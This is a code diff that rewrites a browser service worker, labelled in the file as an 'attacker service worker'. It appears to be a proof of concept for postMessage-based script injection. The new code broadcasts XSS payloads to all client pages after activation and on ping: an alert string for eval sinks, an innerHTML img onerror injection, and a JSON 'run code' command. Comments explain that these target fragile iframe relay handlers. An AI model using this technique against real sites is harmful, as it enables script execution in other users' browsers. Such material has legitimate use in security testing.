@@ -1,21 +1,24 @@
-self.addEventListener('install', event => {
-  event.waitUntil(self.skipWaiting());
-});
-self.addEventListener('activate', event => {
-  event.waitUntil(self.clients.claim());
-  // give page a moment then notify any clients
-  setTimeout(() => {
-    self.clients.matchAll().then(clients => {
-      clients.forEach(c => {
-        // message that will be forwarded by the iframe code to the parent
-        c.postMessage("SW_MSG: alert('pwned-from-sw')");
-      });
-    });
-  }, 500);
-});
+// sw.js — attacker service worker
+self.addEventListener('install', e => e.waitUntil(self.skipWaiting()));
+self.addEventListener('activate', e => e.waitUntil(self.clients.claim()));
 
-// also respond to messages from the page (optional)
+function sendAlertPayload(){
+  self.clients.matchAll().then(clients => {
+    clients.forEach(c => {
+      // plain string payload that will be forwarded by the iframe relay
+      // If the parent does `eval(e.data)` or `alert(e.data)`, this will trigger.
+      c.postMessage("alert('pwned-from-sw')");
+      // also send a few variants to catch different fragile handlers:
+      c.postMessage("document.body.innerHTML = '<img src=x onerror=alert(1)>'");
+      c.postMessage(JSON.stringify({cmd:'run', code:"alert('pwned-code-field')"}));
+    });
+  });
+}
+
+// send once shortly after activation
+setTimeout(sendAlertPayload, 300);
+
+// respond to page pings if present
 self.addEventListener('message', ev => {
-  // echo back
-  ev.source.postMessage("SW_ECHO: " + JSON.stringify(ev.data));
+  if(ev.data && ev.data.cmd === 'ping') sendAlertPayload();
 });
